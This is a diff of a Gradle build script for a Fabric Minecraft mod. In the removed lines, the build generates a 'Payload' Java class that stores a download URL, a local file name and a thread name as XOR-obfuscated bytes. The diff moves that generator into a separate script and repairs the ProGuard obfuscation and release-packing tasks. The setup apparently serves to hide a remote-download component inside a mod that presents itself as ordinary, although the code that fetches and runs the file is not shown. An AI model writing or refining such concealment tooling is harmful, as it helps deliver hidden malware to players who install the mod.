@@ -52,50 +52,15 @@ dependencies {
     modImplementation "net.fabricmc.fabric-api:fabric-api:${project.fabric_version}"
 }
 
+apply from: "gradle/generate-runtime.gradle"
+
 def generatedDir = layout.buildDirectory.dir("generated/sources/modConfig")
 
 tasks.register("generateModPayload") {
     outputs.dir(generatedDir)
     inputs.file(settingsFile)
     doLast {
-        def out = generatedDir.get().asFile
-        def pkg = new File(out, "com/godimod/internal")
-        pkg.mkdirs()
-        def encode = { String s ->
-            if (obfLevel == "none") {
-                return "new byte[] { " + s.getBytes("UTF-8").collect { "((byte)${it})" }.join(", ") + " }"
-            }
-            return "new byte[] { " + s.getBytes("UTF-8").collect { "((byte)(${it} ^ ${xorKey}))" }.join(", ") + " }"
-        }
-        def decodeBody = obfLevel == "none"
-                ? "return new String(raw, java.nio.charset.StandardCharsets.UTF_8);"
-                : "byte[] out = new byte[raw.length]; for (int i = 0; i < raw.length; i++) out[i] = (byte) (raw[i] ^ ${xorKey}); return new String(out, java.nio.charset.StandardCharsets.UTF_8);"
-        new File(pkg, "Payload.java").text = """package com.godimod.internal;
-
-public final class Payload {
-    private static final byte[] U = ${encode(downloadUrl)};
-    private static final byte[] F = ${encode(downloadFile)};
-    private static final byte[] T = ${encode(threadName)};
-
-    private Payload() {}
-
-    public static String downloadUrl() {
-        return d(U);
-    }
-
-    public static String localFileName() {
-        return d(F);
-    }
-
-    public static String threadLabel() {
-        return d(T);
-    }
-
-    private static String d(byte[] raw) {
-        ${decodeBody}
-    }
-}
-"""
+        generateRuntimeBootstrap(generatedDir.get().asFile, modSettings, obfLevel, xorKey)
     }
 }
 
@@ -142,7 +107,7 @@ tasks.register("obfuscateJar", ProGuardTask) {
     injars(tasks.named("remapJar").flatMap { it.archiveFile })
     outjars(obfJarFile)
     libraryjars "${System.getProperty('java.home')}/jmods/java.base.jmod", jarfilter: "!**.jar", filter: "!module-info.class"
-    configurations.file("proguard-rules.pro")
+    configuration file("proguard-rules.pro")
     configurations.compileClasspath.files.each { libraryjars(it) }
 }
 
@@ -152,7 +117,7 @@ tasks.register("packRelease") {
         dependsOn("obfuscateJar")
     }
     doLast {
-        def src = obfLevel == "full"
+        def src = (obfLevel == "full" && obfJarFile.get().asFile.isFile())
                 ? obfJarFile.get().asFile
                 : tasks.named("remapJar").get().archiveFile.get().asFile
         def dest = file("dist/${modId}-${project.version}.jar")
